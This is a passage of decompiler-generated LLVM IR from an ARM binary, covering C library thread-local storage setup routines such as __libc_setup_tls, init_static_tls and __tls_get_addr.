; uselistorder directives
  uselistorder i32 %v2_2d0ac, { 1, 0, 2 }
  uselistorder i32 %v2_2d094, { 1, 2, 0, 3 }
  uselistorder i32 %v4_2d070, { 1, 0, 2 }
  uselistorder i32 %v3_2d050, { 1, 0, 2, 3 }
  uselistorder i32 %v1_2cff4, { 2, 1, 0 }
  uselistorder i32 %v2_2cfc4, { 1, 0, 2 }
  uselistorder i32 %v0_2cf58, { 1, 0 }
  uselistorder i32 %v1_2cf14, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_2ce78, { 0, 2, 1, 3 }
  uselistorder i32 %v2_2ce70, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_2ce54, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_2ce4c, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_2ce48, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_2ce38, { 1, 0 }
  uselistorder i32 %v0_2ce34, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_2ce0c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 23, 13, 15, 14, 16, 22, 24, 17, 18, 19, 20, 21, 27, 26, 25, 28, 30, 29 }
  uselistorder i32 860, { 0, 2, 1, 3 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 72) to i32*), { 3, 2, 17, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 20) to i32*), { 0, 2, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 76) to i32*), { 2, 0, 1, 3 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 120) to i32*), { 2, 0, 1, 3 }
  uselistorder i32 120, { 0, 5, 1, 8, 6, 7, 2, 3, 4 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_2d114, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_2d0f8, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_2d024, { 1, 0 }
  uselistorder label %dec_label_pc_2cfc4, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_2cf10, { 1, 2, 0 }
  uselistorder label %dec_label_pc_2cf04, { 1, 0 }
  uselistorder label %dec_label_pc_2cf00, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_2d128(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_2d128:
  %v0_2d128 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2d128, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_2d128
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_2d128, %bb
  %v10_2d140 = phi i32 [ %arg1, %dec_label_pc_2d128 ], [ 0, %bb ]
  ret i32 %v10_2d140

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 84, i32* %r3.global-to-local, align 4
  %v3_2d150 = load i32, i32* @r4, align 4
  store i32 %v3_2d150, i32* %stack_var_-16, align 4
  %v4_2d154 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 84) to i32*), align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_2d15c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 68) to i32*), align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v4_2d164 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 44) to i32*), align 4
  store i32 %v4_2d164, i32* %r4.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v1_2d16c = inttoptr i32 %v4_2d154 to i32*
  %v2_2d16c = load i32, i32* %v1_2d16c, align 4
  %v4_2d170 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 60) to i32*), align 4
  store i32 %v4_2d170, i32* %lr.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v1_2d178 = add i32 %v2_2d16c, 15
  %v4_2d17c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 160) to i32*), align 4
  store i32 %v4_2d17c, i32* @ip, align 4
  %v1_2d180 = load i32, i32* @r0, align 4
  %v2_2d180 = add i32 %v1_2d180, %v1_2d178
  %v1_2d184 = inttoptr i32 %v4_2d15c to i32*
  %v2_2d184 = load i32, i32* %v1_2d184, align 4
  store i32 %v2_2d184, i32* %r3.global-to-local, align 4
  %v1_2d188 = and i32 %v2_2d180, -16
  store i32 %v1_2d188, i32* %v1_2d16c, align 4
  %v0_2d190 = load i32, i32* @r0, align 4
  %v1_2d190 = load i32, i32* %r4.global-to-local, align 4
  %v2_2d190 = inttoptr i32 %v1_2d190 to i32*
  store i32 %v0_2d190, i32* %v2_2d190, align 4
  %v0_2d194 = load i32, i32* @r1, align 4
  %v1_2d194 = load i32, i32* %lr.global-to-local, align 4
  %v2_2d194 = inttoptr i32 %v1_2d194 to i32*
  store i32 %v0_2d194, i32* %v2_2d194, align 4
  %v0_2d198 = load i32, i32* %r3.global-to-local, align 4
  %v1_2d198 = load i32, i32* @ip, align 4
  %v2_2d198 = inttoptr i32 %v1_2d198 to i32*
  store i32 %v0_2d198, i32* %v2_2d198, align 4
  %v2_2d19c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_2d19c, i32* %r4.global-to-local, align 4
  %v1_2d1a0 = load i32, i32* @r0, align 4
  ret i32 %v1_2d1a0
}

define i32 @function_2d1a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_2d1a8:
  %v0_2d1a8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2d1a8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_2d1a8
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_2d1a8, %bb
  %v7_2d1b8 = phi i32 [ %arg1, %dec_label_pc_2d1a8 ], [ 0, %bb ]
  ret i32 %v7_2d1b8

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r3.global-to-local, align 4
  %v4_2d1cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 96) to i32*), align 4
  store i32 %v4_2d1cc, i32* @lr, align 4
  %v4_2d1d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 68) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 27984) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 27984), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_2d1f8 = inttoptr i32 %v4_2d1d8 to i32*
  store i32 1, i32* %v2_2d1f8, align 4
  %v0_2d1fc = load i32, i32* %r3.global-to-local, align 4
  %v1_2d1fc = load i32, i32* @lr, align 4
  %v2_2d1fc = inttoptr i32 %v1_2d1fc to i32*
  store i32 %v0_2d1fc, i32* %v2_2d1fc, align 4
  %v0_2d200 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_2d218(i32 %arg1) local_unnamed_addr {
dec_label_pc_2d218:
  %v0_2d218 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2d218, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_2d218
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_2d218, %bb
  %v10_2d220 = phi i32 [ %arg1, %dec_label_pc_2d218 ], [ 0, %bb ]
  ret i32 %v10_2d220

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_2d22c = call i32 @__aeabi_read_tp()
  %v1_2d230 = inttoptr i32 %v0_2d22c to i32*
  %v2_2d230 = load i32, i32* %v1_2d230, align 4
  %v1_2d234 = add i32 %arg1, 4
  %v2_2d234 = inttoptr i32 %v1_2d234 to i32*
  %v3_2d234 = load i32, i32* %v2_2d234, align 4
  %v1_2d238 = add i32 %v2_2d230, 8
  %v2_2d238 = inttoptr i32 %v1_2d238 to i32*
  %v3_2d238 = load i32, i32* %v2_2d238, align 4
  %v2_2d23c = add i32 %v3_2d238, %v3_2d234
  ret i32 %v2_2d23c
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_2d248 = load i32, i32* @r4, align 4
  store i32 %v3_2d248, i32* %stack_var_-36, align 4
  %v6_2d248 = load i32, i32* @r5, align 4
  %v15_2d248 = load i32, i32* @r8, align 4
  %v18_2d248 = load i32, i32* @sb, align 4
  %v21_2d248 = load i32, i32* @sl, align 4
  %v24_2d248 = load i32, i32* @fp, align 4
  %v27_2d248 = load i32, i32* @lr, align 4
  store i32 116, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %sl.global-to-local, align 4
  %v4_2d258 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 116) to i32*), align 4
  store i32 %v4_2d258, i32* %r3.global-to-local, align 4
  %v1_2d25c = inttoptr i32 %v4_2d258 to i32*
  %v2_2d25c = load i32, i32* %v1_2d25c, align 4
  store i32 %v2_2d25c, i32* %r2.global-to-local, align 4
  %v2_2d260 = icmp eq i32 %v2_2d25c, 0
  %v0_2d268 = load i32, i32* %r0.global-to-local, align 4
  %v0_2d26c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_2d26c, i32* %ip.global-to-local, align 4
  br i1 %v2_2d260, label %dec_label_pc_2d434, label %dec_label_pc_2d274

dec_label_pc_2d274:                               ; preds = %entry
  store i32 172, i32* %r3.global-to-local, align 4
  %v4_2d278 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 172) to i32*), align 4
  store i32 %v4_2d278, i32* @lr, align 4
  store i32 %v2_2d25c, i32* %r1.global-to-local, align 4
  %v1_2d2c0 = inttoptr i32 %v4_2d278 to i32*
  %v2_2d2c061 = load i32, i32* %v1_2d2c0, align 4
  %v4_2d2c462 = mul i32 %v2_2d2c061, 32
  %v5_2d2c463 = add i32 %v4_2d2c462, %v2_2d25c
  store i32 %v5_2d2c463, i32* %r3.global-to-local, align 4
  %v3_2d2c865 = icmp ult i32 %v2_2d25c, %v5_2d2c463
  br i1 %v3_2d2c865, label %dec_label_pc_2d284, label %dec_label_pc_2d434.loopexit

dec_label_pc_2d284:                               ; preds = %dec_label_pc_2d274, %dec_label_pc_2d2bc
  %v0_2d29c66 = phi i32 [ %v1_2d2bc, %dec_label_pc_2d2bc ], [ %v2_2d25c, %dec_label_pc_2d274 ]
  %v1_2d284 = inttoptr i32 %v0_2d29c66 to i32*
  %v2_2d284 = load i32, i32* %v1_2d284, align 4
  store i32 %v2_2d284, i32* %r3.global-to-local, align 4
  %v7_2d288 = icmp eq i32 %v2_2d284, 7
  br i1 %v7_2d288, label %dec_label_pc_2d290, label %dec_label_pc_2d2bc

dec_label_pc_2d290:                               ; preds = %dec_label_pc_2d284
  %v1_2d290 = add i32 %v0_2d29c66, 20
  %v2_2d290 = inttoptr i32 %v1_2d290 to i32*
  %v3_2d290 = load i32, i32* %v2_2d290, align 4
  store i32 %v3_2d290, i32* %r3.global-to-local, align 4
  %v1_2d294 = add i32 %v0_2d29c66, 28
  %v2_2d294 = inttoptr i32 %v1_2d294 to i32*
  %v3_2d294 = load i32, i32* %v2_2d294, align 4
  store i32 %v3_2d294, i32* @r6, align 4
  %v1_2d29c = add i32 %v0_2d29c66, 16
  %v2_2d29c = inttoptr i32 %v1_2d29c to i32*
  %v3_2d29c = load i32, i32* %v2_2d29c, align 4
  store i32 %v3_2d29c, i32* %r3.global-to-local, align 4
  %v1_2d2a0 = add i32 %v0_2d29c66, 8
  %v2_2d2a0 = inttoptr i32 %v1_2d2a0 to i32*
  %v3_2d2a0 = load i32, i32* %v2_2d2a0, align 4
  store i32 %v3_2d2a0, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_2d294, %v0_2d26c
  %v0_2d26c.v3_2d294 = select i1 %tmp78, i32 %v0_2d26c, i32 %v3_2d294
  store i32 %v0_2d26c.v3_2d294, i32* %fp.global-to-local, align 4
  %v2_2d2d8 = icmp eq i32 %v3_2d294, 0
  br i1 %v2_2d2d8, label %dec_label_pc_2d300, label %bb

dec_label_pc_2d2bc:                               ; preds = %dec_label_pc_2d284
  %v1_2d2bc = add i32 %v0_2d29c66, 32
  store i32 %v1_2d2bc, i32* %r1.global-to-local, align 4
  %v2_2d2c0 = load i32, i32* %v1_2d2c0, align 4
  %v4_2d2c4 = mul i32 %v2_2d2c0, 32
  %v5_2d2c4 = add i32 %v4_2d2c4, %v2_2d25c
  store i32 %v5_2d2c4, i32* %r3.global-to-local, align 4
  %v3_2d2c8 = icmp ult i32 %v1_2d2bc, %v5_2d2c4
  br i1 %v3_2d2c8, label %dec_label_pc_2d284, label %dec_label_pc_2d2c0.dec_label_pc_2d434.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_2d290
  %v2_2d2dc = add i32 %v3_2d294, -1
  br label %dec_label_pc_2d304

dec_label_pc_2d300:                               ; preds = %dec_label_pc_2d290, %dec_label_pc_2d434
  %v0_2d314.pre = phi i32 [ %v0_2d314.pre.pre, %dec_label_pc_2d434 ], [ ptrtoint (i32* @global_var_428d0.3044 to i32), %dec_label_pc_2d290 ]
  %v1_2d304.pre = phi i32 [ %v1_2d304.pre.pre, %dec_label_pc_2d434 ], [ %v0_2d268, %dec_label_pc_2d290 ]
  %v1_2d32825 = phi i32 [ %v0_2d43c, %dec_label_pc_2d434 ], [ %v0_2d26c.v3_2d294, %dec_label_pc_2d290 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_2d434 ], [ %v3_2d290, %dec_label_pc_2d290 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_2d434 ], [ %v3_2d29c, %dec_label_pc_2d290 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_2d434 ], [ %v3_2d2a0, %dec_label_pc_2d290 ]
  br label %dec_label_pc_2d304

dec_label_pc_2d304:                               ; preds = %bb, %dec_label_pc_2d300
  %storemerge80 = phi i32 [ %v2_2d2dc, %bb ], [ 0, %dec_label_pc_2d300 ]
  %v0_2d304 = phi i32 [ %v2_2d2dc, %bb ], [ 0, %dec_label_pc_2d300 ]
  %storemerge = phi i32 [ %v3_2d294, %bb ], [ 1, %dec_label_pc_2d300 ]
  %storemerge79 = phi i32 [ %v3_2d294, %bb ], [ 1, %dec_label_pc_2d300 ]
  %v0_2d314 = phi i32 [ ptrtoint (i32* @global_var_428d0.3044 to i32), %bb ], [ %v0_2d314.pre, %dec_label_pc_2d300 ]
  %v1_2d304 = phi i32 [ %v0_2d268, %bb ], [ %v1_2d304.pre, %dec_label_pc_2d300 ]
  %v1_2d328 = phi i32 [ %v0_2d26c.v3_2d294, %bb ], [ %v1_2d32825, %dec_label_pc_2d300 ]
  %stack_var_-52.3 = phi i32 [ %v3_2d290, %bb ], [ %stack_var_-52.0, %dec_label_pc_2d300 ]
  %stack_var_-48.3 = phi i32 [ %v3_2d29c, %bb ], [ %stack_var_-48.0, %dec_label_pc_2d300 ]
  %stack_var_-44.3 = phi i32 [ %v3_2d2a0, %bb ], [ %stack_var_-44.0, %dec_label_pc_2d300 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_2d304 = add i32 %v1_2d304, %v0_2d304
  %v2_2d308 = udiv i32 %v2_2d304, %storemerge
  store i32 %v2_2d308, i32* %r0.global-to-local, align 4
  %v2_2d30c = mul i32 %v2_2d308, %storemerge
  store i32 %v2_2d30c, i32* %sb.global-to-local, align 4
  store i32 84, i32* %r3.global-to-local, align 4
  %v2_2d314 = add i32 %v0_2d314, 84
  %v3_2d314 = inttoptr i32 %v2_2d314 to i32*
  %v4_2d314 = load i32, i32* %v3_2d314, align 4
  store i32 %v4_2d314, i32* %r3.global-to-local, align 4
  %v1_2d318 = inttoptr i32 %v4_2d314 to i32*
  %v2_2d318 = load i32, i32* %v1_2d318, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_2d320 = add i32 %v1_2d328, 1168
  %v2_2d324 = add i32 %v1_2d320, %stack_var_-52.3
  %v2_2d328 = add i32 %v2_2d324, %v2_2d30c
  %v2_2d32c = add i32 %v2_2d328, %v2_2d318
  store i32 %v2_2d32c, i32* %r0.global-to-local, align 4
  %v1_2d330 = call i32 @__GI_sbrk(i32 %v2_2d32c)
  %v1_2d334 = load i32, i32* %fp.global-to-local, align 4
  %v1_2d33c = sub i32 0, %v1_2d334
  store i32 27472, i32* %r4.global-to-local, align 4
  %v2_2d334 = add i32 %v1_2d330, 1167
  %v1_2d344 = add i32 %v2_2d334, %v1_2d334
  %v2_2d348 = and i32 %v1_2d344, %v1_2d33c
  store i32 %v2_2d348, i32* @r5, align 4
  %v1_2d350 = load i32, i32* %sl.global-to-local, align 4
  %v3_2d350 = add i32 %v1_2d350, 27472
  %v4_2d350 = inttoptr i32 %v3_2d350 to i32*
  store i32 62, i32* %v4_2d350, align 4
  %v0_2d358 = load i32, i32* @r5, align 4
  %v1_2d358 = load i32, i32* %sb.global-to-local, align 4
  %v2_2d358 = add i32 %v1_2d358, %v0_2d358
  store i32 %v2_2d358, i32* @ip, align 4
  %v0_2d35c = load i32, i32* %sl.global-to-local, align 4
  %v1_2d35c = load i32, i32* %r4.global-to-local, align 4
  %v2_2d35c = add i32 %v1_2d35c, %v0_2d35c
  store i32 %v2_2d35c, i32* %r4.global-to-local, align 4
  %v2_2d360 = add i32 %v0_2d35c, 28760
  store i32 %v2_2d360, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_2d358, i32* @r0, align 4
  %v2_2d374 = add i32 %v2_2d35c, 16
  %v3_2d374 = inttoptr i32 %v2_2d374 to i32*
  store i32 %v2_2d358, i32* %v3_2d374, align 4
  %v0_2d378 = load i32, i32* %sb.global-to-local, align 4
  %v1_2d378 = load i32, i32* %r8.global-to-local, align 4
  %v2_2d378 = add i32 %v1_2d378, 40
  %v3_2d378 = inttoptr i32 %v2_2d378 to i32*
  store i32 %v0_2d378, i32* %v3_2d378, align 4
  %v0_2d37c = load i32, i32* @r3, align 4
  %v1_2d37c = trunc i32 %v0_2d37c to i8
  %v2_2d37c = load i32, i32* %r4.global-to-local, align 4
  %v3_2d37c = add i32 %v2_2d37c, 20
  %v4_2d37c = inttoptr i32 %v3_2d37c to i8*
  store i8 %v1_2d37c, i8* %v4_2d37c, align 1
  %v0_2d380 = load i32, i32* %r4.global-to-local, align 4
  %v1_2d380 = add i32 %v0_2d380, 8
  store i32 %v1_2d380, i32* @r4, align 4
  %v0_2d384 = call i32 @memcpy()
  %v0_2d38c = load i32, i32* @r4, align 4
  %v1_2d38c = load i32, i32* @r5, align 4
  %v2_2d38c = inttoptr i32 %v1_2d38c to i32*
  store i32 %v0_2d38c, i32* %v2_2d38c, align 4
  %v0_2d390 = load i32, i32* @r5, align 4
  store i32 %v0_2d390, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_2d390, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_26764.3322 to i32))
  store i32 96, i32* %r3.global-to-local, align 4
  %v0_2d3a4 = load i32, i32* %sl.global-to-local, align 4
  %v2_2d3a4 = add i32 %v0_2d3a4, 96
  %v3_2d3a4 = inttoptr i32 %v2_2d3a4 to i32*
  %v4_2d3a4 = load i32, i32* %v3_2d3a4, align 4
  store i32 %v4_2d3a4, i32* %ip.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 27984, i32* %r1.global-to-local, align 4
  %v2_2d3b0 = add i32 %v0_2d3a4, 68
  %v3_2d3b0 = inttoptr i32 %v2_2d3b0 to i32*
  %v4_2d3b0 = load i32, i32* %v3_2d3b0, align 4
  store i32 %v4_2d3b0, i32* %r0.global-to-local, align 4
  %v3_2d3b8 = add i32 %v0_2d3a4, 27984
  %v4_2d3b8 = inttoptr i32 %v3_2d3b8 to i32*
  store i32 64, i32* %v4_2d3b8, align 4
  %v1_2d3c0 = load i32, i32* %r8.global-to-local, align 4
  %v2_2d3c0 = add i32 %v1_2d3c0, 20
  %v3_2d3c0 = inttoptr i32 %v2_2d3c0 to i32*
  store i32 %stack_var_-44.3, i32* %v3_2d3c0, align 4
  %v1_2d3c8 = load i32, i32* %r8.global-to-local, align 4
  %v2_2d3c8 = add i32 %v1_2d3c8, 24
  %v3_2d3c8 = inttoptr i32 %v2_2d3c8 to i32*
  store i32 %stack_var_-48.3, i32* %v3_2d3c8, align 4
  %v1_2d3d0 = load i32, i32* %r0.global-to-local, align 4
  %v2_2d3d0 = inttoptr i32 %v1_2d3d0 to i32*
  store i32 1, i32* %v2_2d3d0, align 4
  %v1_2d3d8 = load i32, i32* %r8.global-to-local, align 4
  %v2_2d3d8 = add i32 %v1_2d3d8, 28
  %v3_2d3d8 = inttoptr i32 %v2_2d3d8 to i32*
  store i32 %stack_var_-52.3, i32* %v3_2d3d8, align 4
  %v0_2d3e0 = load i32, i32* @r6, align 4
  %v2_2d3e0 = icmp eq i32 %v0_2d3e0, 0
  %v1_2d3e4 = load i32, i32* %r8.global-to-local, align 4
  %v2_2d3e4 = add i32 %v1_2d3e4, 44
  %v3_2d3e4 = inttoptr i32 %v2_2d3e4 to i32*
  store i32 1, i32* %v3_2d3e4, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_2d3ec = load i32, i32* %sl.global-to-local, align 4
  %v1_2d3ec = load i32, i32* %r1.global-to-local, align 4
  %v2_2d3ec = add i32 %v1_2d3ec, %v0_2d3ec
  store i32 %v2_2d3ec, i32* %r2.global-to-local, align 4
  %v1_2d3f0 = load i32, i32* @r6, align 4
  br i1 %v2_2d3e0, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_2d304
  store i32 %v1_2d3f0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_2d3fc34 = load i32, i32* %r8.global-to-local, align 4
  %v2_2d3fc35 = add i32 %v1_2d3fc34, 32
  %v3_2d3fc36 = inttoptr i32 %v2_2d3fc35 to i32*
  store i32 %v1_2d3f0, i32* %v3_2d3fc36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_2d304
  %v2_2d3f4 = add i32 %v1_2d3f0, -1
  store i32 %v2_2d3f4, i32* %r0.global-to-local, align 4
  %v1_2d3fc = load i32, i32* %r8.global-to-local, align 4
  %v2_2d3fc = add i32 %v1_2d3fc, 32
  %v3_2d3fc = inttoptr i32 %v2_2d3fc to i32*
  store i32 %v1_2d3f0, i32* %v3_2d3fc, align 4
  %v1_2d400 = load i32, i32* @r6, align 4
  store i32 %v1_2d400, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_2d404 = load i32, i32* %r8.global-to-local, align 4
  %v1_2d404 = load i32, i32* %r2.global-to-local, align 4
  %v2_2d404 = add i32 %v1_2d404, 28
  %v3_2d404 = inttoptr i32 %v2_2d404 to i32*
  store i32 %v0_2d404, i32* %v3_2d404, align 4
  %v0_2d408 = load i32, i32* %r2.global-to-local, align 4
  %v1_2d408 = load i32, i32* %ip.global-to-local, align 4
  %v2_2d408 = inttoptr i32 %v1_2d408 to i32*
  store i32 %v0_2d408, i32* %v2_2d408, align 4
  %v0_2d40c = load i32, i32* %r0.global-to-local, align 4
  %v1_2d40c = load i32, i32* %r3.global-to-local, align 4
  %v2_2d40c = add i32 %v1_2d40c, %v0_2d40c
  store i32 %v2_2d40c, i32* %r0.global-to-local, align 4
  %v1_2d410 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_2d3e0, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_2d418.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_2d418 = phi i32 [ %v0_2d418.pre, %._crit_edge ], [ %v1_2d410, %bb54 ]
  %v2_2d414 = udiv i32 %v2_2d40c, %v1_2d410
  %v2_2d418 = load i32, i32* %sb.global-to-local, align 4
  %v3_2d418 = mul i32 %v2_2d414, %v0_2d418
  %v4_2d418 = add i32 %v2_2d418, %v3_2d418
  store i32 %v4_2d418, i32* @r0, align 4
  %v0_2d41c = load i32, i32* %fp.global-to-local, align 4
  %v2_2d41c = icmp ult i32 %v0_2d41c, 16
  %v0_2d41c. = select i1 %v2_2d41c, i32 16, i32 %v0_2d41c
  store i32 %v0_2d41c., i32* @r1, align 4
  %v2_2d42c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_2d42c, i32* @r4, align 4
  store i32 %v6_2d248, i32* @r5, align 4
  store i32 %v15_2d248, i32* %r8.global-to-local, align 4
  store i32 %v18_2d248, i32* %sb.global-to-local, align 4
  store i32 %v21_2d248, i32* %sl.global-to-local, align 4
  store i32 %v24_2d248, i32* %fp.global-to-local, align 4
  store i32 %v27_2d248, i32* @lr, align 4
  %v0_2d430 = call i32 @init_static_tls()
  store i32 %v0_2d430, i32* %r0.global-to-local, align 4
  %v0_2d43c.pre = load i32, i32* @ip, align 4
  %v1_2d304.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_2d314.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_2d434

dec_label_pc_2d2c0.dec_label_pc_2d434.loopexit_crit_edge: ; preds = %dec_label_pc_2d2bc
  br label %dec_label_pc_2d434.loopexit

dec_label_pc_2d434.loopexit:                      ; preds = %dec_label_pc_2d2c0.dec_label_pc_2d434.loopexit_crit_edge, %dec_label_pc_2d274
  br label %dec_label_pc_2d434

dec_label_pc_2d434:                               ; preds = %dec_label_pc_2d434.loopexit, %entry, %bb55
  %v0_2d314.pre.pre = phi i32 [ ptrtoint (i32* @global_var_428d0.3044 to i32), %dec_label_pc_2d434.loopexit ], [ ptrtoint (i32* @global_var_428d0.3044 to i32), %entry ], [ %v0_2d314.pre.pre.pre, %bb55 ]
  %v1_2d304.pre.pre = phi i32 [ %v0_2d268, %dec_label_pc_2d434.loopexit ], [ %v0_2d268, %entry ], [ %v1_2d304.pre.pre.pre, %bb55 ]
  %v0_2d43c = phi i32 [ %v0_2d26c, %dec_label_pc_2d434.loopexit ], [ %v0_2d26c, %entry ], [ %v0_2d43c.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_2d43c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_2d300

; uselistorder directives
  uselistorder i32 %v0_2d43c, { 1, 0 }
  uselistorder i32 %v1_2d3f0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_2d35c, { 1, 0 }
  uselistorder i32 %v2_2d358, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_2d2bc, { 2, 1, 0 }
  uselistorder i32 %v3_2d294, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_2d29c66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_2d2c0, { 1, 0 }
  uselistorder i32 %v0_2d26c, { 2, 3, 1, 0, 4 }
